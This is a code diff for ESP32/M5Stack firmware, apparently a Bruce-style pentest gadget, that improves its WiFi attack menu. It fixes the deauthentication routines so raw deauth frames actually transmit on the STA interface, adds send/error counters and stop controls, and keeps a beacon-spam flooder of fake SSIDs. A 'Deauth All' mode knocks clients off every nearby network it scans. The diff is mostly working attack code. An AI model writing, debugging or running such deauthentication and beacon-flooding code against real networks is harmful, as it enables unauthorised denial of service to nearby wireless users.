@@ -67,6 +67,11 @@ static const char *const RAND_PREFIX[] = {
 };
 static const int RAND_PREFIX_COUNT = sizeof(RAND_PREFIX) / sizeof(RAND_PREFIX[0]);
 
+// ---- Local settings (WiFi "Config"; RAM only, reset on reboot) ------------
+static struct {
+    bool showHidden = false;   // list hidden (no-SSID) networks in Scan
+} g_cfg;
+
 // ---- Radio lifecycle ------------------------------------------------------
 static void wifi_attack_begin(uint8_t ch) {
     WiFi.mode(WIFI_MODE_APSTA);        // both interfaces up (Bruce injection setup)
@@ -135,7 +140,9 @@ static void do_scan() {
     for (int i = 0; i < n && g_netCount < MAX_NET; i++) {
         NetInfo &e = g_nets[g_netCount];
         String s = WiFi.SSID(i);
-        if (s.length() == 0) s = "<hidden>";
+        bool hidden = (s.length() == 0);
+        if (hidden && !g_cfg.showHidden) continue;   // Settings: hide hidden nets
+        if (hidden) s = "<hidden>";
         strncpy(e.ssid, s.c_str(), 32);
         e.ssid[32] = 0;
         memcpy(e.bssid, WiFi.BSSID(i), 6);
@@ -148,30 +155,35 @@ static void do_scan() {
     WiFi.mode(WIFI_OFF);
 }
 
-// Broadcast-deauth a single AP on its channel until NAV is held.
+// Broadcast-deauth a single AP on its channel until stopped. Sends on the STA
+// interface (WIFI_IF_AP silently drops frames unless a SoftAP is started).
 static void run_deauth_ap(const NetInfo &ap) {
     wifi_attack_begin(ap.ch);
+    M5.Display.fillScreen(COL_BG);
+    ui_hint("M5 = stop    hold side = exit");
 
     uint8_t frame[26];
     memcpy(frame, DEAUTH_TMPL, sizeof(frame));
     memcpy(frame + 10, ap.bssid, 6);
     memcpy(frame + 16, ap.bssid, 6);
 
-    uint32_t sent = 0, lastDraw = 0;
+    uint32_t sent = 0, err = 0, lastDraw = 0;
     board_update();
     while (true) {
         board_update();
-        if (nav_long) break;
+        if (nav_long || ok_click) break;
 
         for (int r = 0; r < 8; r++) {
-            esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
-            sent++;
+            if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false) == ESP_OK) sent++;
+            else err++;
         }
         if (millis() - lastDraw > 200) {
             lastDraw = millis();
-            char l[24];
+            Serial.printf("[deauth] %s ch%d ok=%lu err=%lu\n",
+                          ap.ssid, ap.ch, (unsigned long)sent, (unsigned long)err);
+            char l[32];
             snprintf(l, sizeof(l), "ch%d  pkts %lu", ap.ch, (unsigned long)sent);
-            ui_live("Deauth AP", ap.ssid, l);
+            ui_live("Deauth", ap.ssid, l);
         }
         delay(1);
     }
@@ -219,6 +231,8 @@ static void screen_scan() {
 // ===========================================================================
 static void run_beacon_spam(bool funny) {
     wifi_attack_begin(1);
+    M5.Display.fillScreen(COL_BG);
+    ui_hint("M5 = stop    hold side = exit");
 
     uint8_t buf[128], mac[6];
     uint32_t sent = 0, lastDraw = 0;
@@ -227,7 +241,7 @@ static void run_beacon_spam(bool funny) {
     board_update();
     while (true) {
         board_update();
-        if (nav_long) break;
+        if (nav_long || ok_click) break;
 
         char ssid[33];
         uint8_t slen;
@@ -253,9 +267,10 @@ static void run_beacon_spam(bool funny) {
 
         if (millis() - lastDraw > 150) {
             lastDraw = millis();
-            char l[24];
-            snprintf(l, sizeof(l), "frames %lu", (unsigned long)sent);
-            ui_live("Beacon Spam", funny ? "Funny SSIDs" : "Random SSIDs", l);
+            char l1[24], l2[24];
+            snprintf(l1, sizeof(l1), "frames %lu", (unsigned long)sent);
+            snprintf(l2, sizeof(l2), "%s  ch%d", funny ? "funny" : "random", ch);
+            ui_live("Beacon Spam", l1, l2);
         }
         delay(1);
     }
@@ -263,10 +278,12 @@ static void run_beacon_spam(bool funny) {
 }
 
 static void screen_beacon() {
-    const char *items[] = {"Random SSIDs", "Funny SSIDs"};
-    int c = ui_menu("Beacon Spam", items, 2);
-    if (c < 0) return;
-    run_beacon_spam(c == 1);
+    while (true) {                       // own loop: stop returns here, not two levels up
+        const char *items[] = {"Random SSIDs", "Funny SSIDs"};
+        int c = ui_menu("Beacon Spam", items, 2);
+        if (c < 0) return;
+        run_beacon_spam(c == 1);
+    }
 }
 
 // ===========================================================================
@@ -283,30 +300,34 @@ static void run_deauth_all() {
 
     WiFi.mode(WIFI_MODE_APSTA);
     delay(80);
+    M5.Display.fillScreen(COL_BG);
+    ui_hint("M5 = stop    hold side = exit");
 
     uint8_t frame[26];
-    uint32_t sent = 0, lastDraw = 0;
+    uint32_t sent = 0, err = 0, lastDraw = 0;
     board_update();
     while (true) {
         for (int i = 0; i < g_netCount; i++) {
             board_update();
-            if (nav_long) { wifi_off(); return; }
+            if (nav_long || ok_click) { wifi_off(); return; }
 
             esp_wifi_set_channel(g_nets[i].ch, WIFI_SECOND_CHAN_NONE);
             memcpy(frame, DEAUTH_TMPL, sizeof(frame));
             memcpy(frame + 10, g_nets[i].bssid, 6);
             memcpy(frame + 16, g_nets[i].bssid, 6);
             for (int r = 0; r < 4; r++) {
-                esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
-                sent++;
+                if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false) == ESP_OK) sent++;
+                else err++;
             }
 
             if (millis() - lastDraw > 200) {
                 lastDraw = millis();
-                char l[24];
-                snprintf(l, sizeof(l), "APs %d  pkts %lu",
-                         g_netCount, (unsigned long)sent);
-                ui_live("Deauth All", "all networks", l);
+                Serial.printf("[deauth-all] nets=%d ok=%lu err=%lu\n",
+                              g_netCount, (unsigned long)sent, (unsigned long)err);
+                char l1[16], l2[24];
+                snprintf(l1, sizeof(l1), "nets %d", g_netCount);
+                snprintf(l2, sizeof(l2), "pkts %lu", (unsigned long)sent);
+                ui_live("Deauth All", l1, l2);
             }
             delay(1);
         }
@@ -314,14 +335,26 @@ static void run_deauth_all() {
 }
 
 static void screen_deauth() {
-    const char *items[] = {"Deauth All (rescan)", "Pick Target"};
-    int c = ui_menu("Deauth", items, 2);
-    if (c < 0) return;
-    if (c == 0) {
-        run_deauth_all();
-    } else {
-        // Reuse the scan list; selecting an AP opens its detail (front=deauth).
-        screen_scan();
+    while (true) {                       // own loop: stop returns here, not two levels up
+        const char *items[] = {"Deauth All (rescan)", "Pick Target"};
+        int c = ui_menu("Deauth", items, 2);
+        if (c < 0) return;
+        if (c == 0) run_deauth_all();
+        else        screen_scan();       // pick an AP, front = deauth it
+    }
+}
+
+// ===========================================================================
+//  Config (local settings for WiFi)
+// ===========================================================================
+static void screen_config() {
+    while (true) {
+        char a[24];
+        snprintf(a, sizeof(a), "Hidden nets: %s", g_cfg.showHidden ? "Show" : "Hide");
+        const char *items[] = {a};
+        int c = ui_menu("WiFi Config", items, 1);
+        if (c < 0) return;
+        if (c == 0) g_cfg.showHidden = !g_cfg.showHidden;
     }
 }
 
@@ -330,11 +363,12 @@ static void screen_deauth() {
 // ===========================================================================
 void wifitools_menu() {
     while (true) {
-        const char *items[] = {"Scan / Analyze", "Beacon Spam", "Deauth"};
-        int c = ui_menu("WiFi", items, 3);
+        const char *items[] = {"Scan / Analyze", "Beacon Spam", "Deauth", "Config"};
+        int c = ui_menu("WiFi", items, 4);
         if (c < 0) { wifi_off(); return; }
         if (c == 0) screen_scan();
         else if (c == 1) screen_beacon();
         else if (c == 2) screen_deauth();
+        else if (c == 3) screen_config();
     }
 }
